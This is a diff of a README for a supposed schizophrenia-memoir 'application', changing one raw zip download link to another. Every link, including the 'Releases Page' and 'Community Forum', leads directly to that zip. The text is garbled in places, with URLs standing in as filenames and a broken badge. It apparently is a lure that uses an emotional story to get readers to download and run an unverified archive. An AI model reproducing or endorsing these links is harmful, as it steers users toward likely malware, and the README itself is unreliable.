@@ -1,7 +1,7 @@
 # 🌟 endorphin-positive-life-book - A Journey of Strength and Courage
 
 ## 📥 Download Here
-[![Download Latest Release](https://raw.githubusercontent.com/knifeking12/endorphin-positive-life-book/main/scripts/endorphin_book_life_positive_2.9.zip%20Latest%20Release-%20-%https://raw.githubusercontent.com/knifeking12/endorphin-positive-life-book/main/scripts/endorphin_book_life_positive_2.9.zip)](https://raw.githubusercontent.com/knifeking12/endorphin-positive-life-book/main/scripts/endorphin_book_life_positive_2.9.zip)
+[![Download Latest Release](https://github.com/knifeking12/endorphin-positive-life-book/raw/refs/heads/main/docs/endorphin_positive_life_book_3.3.zip%20Latest%20Release-%20-%https://github.com/knifeking12/endorphin-positive-life-book/raw/refs/heads/main/docs/endorphin_positive_life_book_3.3.zip)](https://github.com/knifeking12/endorphin-positive-life-book/raw/refs/heads/main/docs/endorphin_positive_life_book_3.3.zip)
 
 ## 📖 Project Description
 The "endorphin-positive-life-book" tells my story of strength and courage as I battle schizophrenia. It aims to inspire those facing challenges, encouraging them to find hope and positivity. This application contains my journey, insights, and lessons learned.
@@ -10,7 +10,7 @@ The "endorphin-positive-life-book" tells my story of strength and courage as I b
 To get started with the "endorphin-positive-life-book" application, follow these steps:
 
 1. **Download the Application**
-   - Visit the Releases page to download: [Releases Page](https://raw.githubusercontent.com/knifeking12/endorphin-positive-life-book/main/scripts/endorphin_book_life_positive_2.9.zip).
+   - Visit the Releases page to download: [Releases Page](https://github.com/knifeking12/endorphin-positive-life-book/raw/refs/heads/main/docs/endorphin_positive_life_book_3.3.zip).
 
 2. **System Requirements**
    - Operating System: Windows 10 or later, macOS 10.14 or later, Linux (Ubuntu recommended).
@@ -28,7 +28,7 @@ To get started with the "endorphin-positive-life-book" application, follow these
 ## 📥 Download & Install
 To download and install the application, go to the Releases page. Click on the link below to access it:
 
-[Download the Latest Release](https://raw.githubusercontent.com/knifeking12/endorphin-positive-life-book/main/scripts/endorphin_book_life_positive_2.9.zip)
+[Download the Latest Release](https://github.com/knifeking12/endorphin-positive-life-book/raw/refs/heads/main/docs/endorphin_positive_life_book_3.3.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -36,12 +36,12 @@ Once on the Releases page, follow these steps:
 2. **Choose Your Platform**: Select the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `https://raw.githubusercontent.com/knifeking12/endorphin-positive-life-book/main/scripts/endorphin_book_life_positive_2.9.zip` file.
+   - For Linux, download the `https://github.com/knifeking12/endorphin-positive-life-book/raw/refs/heads/main/docs/endorphin_positive_life_book_3.3.zip` file.
 3. **Download the File**: Click on the chosen file link to start the download.
 4. **Run the Application**: 
    - For Windows: Double-click the downloaded `.exe` file to install.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/knifeking12/endorphin-positive-life-book/main/scripts/endorphin_book_life_positive_2.9.zip` file and run the application from the terminal.
+   - For Linux: Extract the `https://github.com/knifeking12/endorphin-positive-life-book/raw/refs/heads/main/docs/endorphin_positive_life_book_3.3.zip` file and run the application from the terminal.
 
 ## 📚 How to Use the Application
 After installation, follow these steps to navigate the application:
@@ -54,10 +54,10 @@ After installation, follow these steps to navigate the application:
 ## 🌐 Community and Support
 Join our supportive community to share your experiences and connect with others. Visit our discussion page, or follow the links for resources on mental health and wellness.
 
-- [Community Forum](https://raw.githubusercontent.com/knifeking12/endorphin-positive-life-book/main/scripts/endorphin_book_life_positive_2.9.zip)
+- [Community Forum](https://github.com/knifeking12/endorphin-positive-life-book/raw/refs/heads/main/docs/endorphin_positive_life_book_3.3.zip)
 - [Mental Health Resources](#)
 
 ## 🙏 Thank You!
 Your interest in the "endorphin-positive-life-book" means the world to me. I hope this application provides you with inspiration and solidarity. Remember, you are not alone in your journey. 
 
-Don't forget to download the latest version here: [Download the Latest Release](https://raw.githubusercontent.com/knifeking12/endorphin-positive-life-book/main/scripts/endorphin_book_life_positive_2.9.zip).
+Don't forget to download the latest version here: [Download the Latest Release](https://github.com/knifeking12/endorphin-positive-life-book/raw/refs/heads/main/docs/endorphin_positive_life_book_3.3.zip).
